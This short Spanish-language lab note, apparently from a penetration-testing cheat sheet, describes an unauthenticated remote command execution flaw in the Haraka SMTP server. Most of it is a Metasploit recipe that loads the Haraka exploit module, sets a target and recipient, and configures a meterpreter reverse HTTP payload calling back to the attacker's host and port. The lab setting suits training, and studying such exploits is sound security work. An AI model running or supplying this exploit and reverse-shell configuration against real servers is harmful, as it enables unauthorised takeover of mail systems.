Vulnerabilidad en el servidor SMTP Haraka que permite ejecución remota de comandos.

• Afecta versiones vulnerables de Haraka  
• Permite RCE  
• No requiere autenticación

## Exploit Haraka

Explota el servicio SMTP vulnerable.

```
use exploit/linux/smtp/haraka
```
	set RHOSTS IP  
	set SRVPORT 9898  
	set email_to root@attackdefense.test  
	set PAYLOAD linux/x64/meterpreter_reverse_http  
	set LHOST TU_IP  
	set LPORT 4444
